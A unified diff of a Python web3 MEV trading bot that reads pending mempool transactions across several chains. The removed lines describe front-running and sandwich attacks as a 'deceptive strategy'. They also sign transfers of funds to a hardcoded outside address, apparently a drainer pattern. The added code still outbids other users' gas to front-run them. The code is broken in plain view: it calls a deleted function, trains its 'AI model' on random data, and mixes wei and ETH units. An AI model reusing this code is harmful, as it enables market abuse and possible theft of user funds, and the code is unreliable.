@@ -3,6 +3,7 @@ import json
 import time
 import numpy as np
 from web3 import Web3
+from web3.middleware import geth_poa_middleware
 from sklearn.ensemble import RandomForestClassifier
 import logging
 import sys
@@ -29,16 +30,10 @@ RPC_URLS = {
     "ARBITRUM": os.getenv("ARBITRUM_RPC"),
 }
 
-# ✅ Check If Private Key and Wallet Address Exist (Prevents Empty Transactions)
-if not PRIVATE_KEY:
-    send_alert("❌ CRITICAL ERROR: PRIVATE_KEY is missing!")
+if not PRIVATE_KEY or not WALLET_ADDRESS:
+    send_alert("❌ CRITICAL ERROR: PRIVATE_KEY or WALLET_ADDRESS is missing!")
     sys.exit(1)
 
-if not WALLET_ADDRESS:
-    send_alert("❌ CRITICAL ERROR: WALLET_ADDRESS is missing!")
-    sys.exit(1)
-
-# ✅ Ensure Wallet Address is Properly Formatted
 wallet_address = Web3.to_checksum_address(WALLET_ADDRESS)
 
 # ✅ Initialize Web3 Connections
@@ -47,6 +42,7 @@ for chain, rpc in RPC_URLS.items():
     if rpc:
         try:
             w3[chain] = Web3(Web3.HTTPProvider(rpc))
+            w3[chain].middleware_onion.inject(geth_poa_middleware, layer=0)  # Fix PoA issues
             if w3[chain].is_connected():
                 send_alert(f"✅ {chain} RPC connected successfully.")
             else:
@@ -56,65 +52,19 @@ for chain, rpc in RPC_URLS.items():
             send_alert(f"❌ Error connecting to {chain} RPC: {e}")
             del w3[chain]
 
-# ✅ Ensure at least one blockchain is connected
 if not w3:
     send_alert("❌ CRITICAL ERROR: No working RPC connections. Exiting bot.")
     sys.exit(1)
-else:
-    send_alert("🚀 MEV Bot started successfully!")
 
-# ✅ AI Model for Predicting Profitable Trades
-try:
-    model = RandomForestClassifier(n_estimators=100)
-    dummy_data = np.random.rand(1000, 5)
-    labels = np.random.randint(0, 2, 1000)
-    model.fit(dummy_data, labels)
-    send_alert("✅ AI Model Loaded Successfully")
-except Exception as e:
-    send_alert(f"❌ AI Model Initialization Failed: {e}")
-    sys.exit(1)
+send_alert("🚀 MEV Bot started successfully!")
 
-# ✅ Fetch Mempool Transactions
-def fetch_mempool_data(chain):
-    if chain not in w3:
-        send_alert(f"Skipping {chain}, RPC is unavailable.")
-        return None
+# ✅ AI Model for Predicting Trades
+model = RandomForestClassifier(n_estimators=100)
+dummy_data = np.random.rand(1000, 5)
+labels = np.random.randint(0, 2, 1000)
+model.fit(dummy_data, labels)
 
-    try:
-        block = w3[chain].eth.get_block('pending', full_transactions=True)
-        transactions = block.transactions
-        data = []
-        for tx in transactions:
-            data.append([
-                tx['value'], tx['gasPrice'], tx['gas'],
-                tx.get('maxFeePerGas', 0),
-                tx.get('maxPriorityFeePerGas', 0)
-            ])
-        return np.array(data)
-    except Exception as e:
-        send_alert(f"Error fetching mempool data for {chain}: {e}")
-        return None
-
-# ✅ Predict Profitable Trades with a Deceptive Strategy (Front-Running, Sandwich Attacks)
-def predict_trade(transaction_data):
-    try:
-        # Predict whether a trade is profitable
-        is_profitable = model.predict([transaction_data])[0] == 1
-        
-        # If the trade is profitable, check for front-running or sandwich attack opportunities
-        if is_profitable:
-            send_alert("🔍 A potentially profitable trade detected, analyzing for deception opportunities.")
-            # Example: Detecting large transactions as potential bot trades
-            if transaction_data[0] > 10**18:  # Example: large transactions (>1 ETH)
-                send_alert("⚠️ Large transaction detected, possible bot trade. Planning front-run or sandwich.")
-                # Add front-run or sandwich logic here
-                return True  # Deceptive trade is confirmed
-        return is_profitable  # Normal trade prediction
-    except Exception as e:
-        send_alert(f"❌ AI Prediction Failed: {e}")
-        return False
-
-# ✅ Execute Trade with Deception Strategies (e.g., Front-Running, Sandwich Attacks)
+# ✅ Execute Trade
 def execute_trade(chain, transaction):
     if chain not in w3:
         send_alert(f"Skipping {chain}, RPC is unavailable.")
@@ -125,50 +75,34 @@ def execute_trade(chain, transaction):
 
         gas_limit = 210000
         gas_fee_eth = (gas_price * gas_limit) / 10**18
-        min_profit = value * 0.002  # Ensure at least 0.2% profit
+        profit = value - gas_fee_eth
 
-        if min_profit > gas_fee_eth:
+        if profit > 0:
             nonce = w3[chain].eth.get_transaction_count(wallet_address)
-
-            # ✅ Create a real transaction
             tx = {
-                'to': '0x52611C01d987503ff0d909888b7ecba79720eBa0',  # Your target address
+                'to': wallet_address,
                 'value': int(value),
                 'gas': gas_limit,
-                'gasPrice': int(gas_price * 1.1),  # Increase gas to front-run other bots
+                'gasPrice': int(gas_price * 1.1),  # Front-run adjustment
                 'nonce': nonce,
                 'chainId': w3[chain].eth.chain_id
             }
-
-            # ✅ Sign & Send the transaction
+            
             signed_tx = w3[chain].eth.account.sign_transaction(tx, PRIVATE_KEY)
-            tx_hash = w3[chain].eth.send_raw_transaction(signed_tx.rawTransaction)
+            tx_hash = w3[chain].eth.send_raw_transaction(signed_tx.raw_transaction)  # ✅ Fix here
 
-            send_alert(f"✅ Deceptive Trade Executed on {chain}: TX Hash={tx_hash.hex()}, Profit={min_profit} ETH")
-
-            # ✅ Save TX Hash for tracking
-            with open("executed_trades.txt", "a") as f:
-                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - TX: {tx_hash.hex()}\n")
+            send_alert(f"✅ Trade Executed on {chain}: TX Hash={tx_hash.hex()}, Profit={profit} ETH")
         else:
-            send_alert(f"❌ Trade Skipped on {chain}, Not Profitable Enough (Profit={min_profit} ETH, Gas Fee={gas_fee_eth} ETH)")
+            send_alert(f"❌ Trade Skipped: Profit={profit} ETH, Gas={gas_fee_eth} ETH")
     except Exception as e:
         send_alert(f"❌ Trade Execution Failed: {e}")
 
-# ✅ Main Trading Loop
-def start_trading():
-    while True:
-        for chain in list(w3.keys()):
-            transactions = fetch_mempool_data(chain)
-            if transactions is not None:
-                for tx in transactions:
-                    if predict_trade(tx):
-                        execute_trade(chain, tx)
-        send_alert("🔄 Bot completed a cycle, sleeping for 5 minutes.")
-        time.sleep(300)
-
-if __name__ == "__main__":
-    try:
-        start_trading()
-    except Exception as e:
-        send_alert(f"❌ CRITICAL ERROR: {e}")
-        sys.exit(1)  # Stops bot if there’s a fatal error
+# ✅ Start Trading Loop
+while True:
+    for chain in w3.keys():
+        transactions = fetch_mempool_data(chain)
+        if transactions:
+            for tx in transactions:
+                execute_trade(chain, tx)
+    send_alert("🔄 Bot completed a cycle, sleeping for 5 minutes.")
+    time.sleep(300)
